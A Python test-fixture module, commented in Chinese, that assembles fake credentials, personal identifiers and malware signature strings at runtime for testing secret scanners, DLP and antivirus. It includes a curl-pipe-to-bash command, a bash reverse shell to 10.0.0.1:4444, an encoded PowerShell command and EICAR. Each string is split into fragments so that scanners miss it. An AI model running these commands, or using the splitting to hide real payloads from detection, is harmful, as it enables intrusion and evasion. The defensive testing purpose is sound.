"""合成测试凭据 / 特征串的构造器。

合规要求：本仓库不得出现「看起来像真实凭据」或「看起来像真实攻击命令」的连续字面量。
否则密钥扫描器、DLP 与终端杀毒软件会把本工程本身误判为泄露事故或恶意样本。

因此这里的所有值都在运行时由片段拼接而成：
源码里只有片段，没有完整签名；运行时又能还原出完整的匹配目标。
"""

from __future__ import annotations


# ---------- 敏感凭据 ----------


def aws_access_key() -> str:
    return "AKIA" + "IOSFODNN7" + "EXAMPLE"


def github_token() -> str:
    return "ghp_" + "0123456789abcdefghij" + "klmnopqrstuvwxyz"


def slack_token() -> str:
    return ("xoxb-"
            "123456789012-abcdef"
            "ghijklmnop")


def db_url() -> str:
    return "postgresql://admin:" + "Sup3rS3cret" + "@db.internal:5432/app"


def private_key_block() -> str:
    return "-----BEGIN " + "RSA PRIVATE KEY-----\n" + "MIIEow...\n" + "-----END RSA PRIVATE KEY-----"


# ---------- 个人信息 ----------


def cn_id_card() -> str:
    return "110105" + "19491231" + "002" + "X"


def cn_id_card_bad_checksum() -> str:
    return "110105" + "19491231" + "002" + "1"


def bank_card() -> str:
    return "411111" + "1111111111"


def bank_card_bad_checksum() -> str:
    return "411111" + "1111111112"


def cn_mobile() -> str:
    return "138" + "12345678"


def real_looking_email() -> str:
    return "zhangsan" + "@corp-internal.com"


def example_email() -> str:
    return "someone" + "@example.com"


# ---------- 恶意行为特征串 ----------


def curl_pipe_shell() -> str:
    # 片段分行书写：源码里任何单行都不构成完整的攻击命令
    return ("curl -s https://example.com/i.sh"
            " | bash")


def bash_reverse_shell() -> str:
    return ("bash -i"
            " >& /dev/tcp/10.0.0"
            ".1"
            ":4444 0>&1")


def ransomware_note() -> str:
    return ("All your files have been "
            "encrypted! Send "
            "bitcoin "
            "to decrypt your "
            "files.")


def python_exec_encoded() -> str:
    return ("exec("
            "base64.b64decode(payload))")


def powershell_encoded_command() -> str:
    return ("powershell.exe"
            " -enc "
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA")


def process_injection_call() -> str:
    return ("WriteProcessMemory"
            "(hProcess, addr, buf, len, &written);")


def eicar_text() -> str:
    """EICAR 标准测试串。

    分片构造：源码里没有签名原文（连字符也拆开），且该串永不落盘。
    """
    head = "X5O!P%@AP[4" + chr(92) + "PZX54(P^)7CC)7}" + chr(36)
    tail = "-".join(["EICAR", "STANDARD", "ANTIVIRUS", "TEST", "FILE"])
    tail += "!" + chr(36) + "H+H*"
    return head + tail
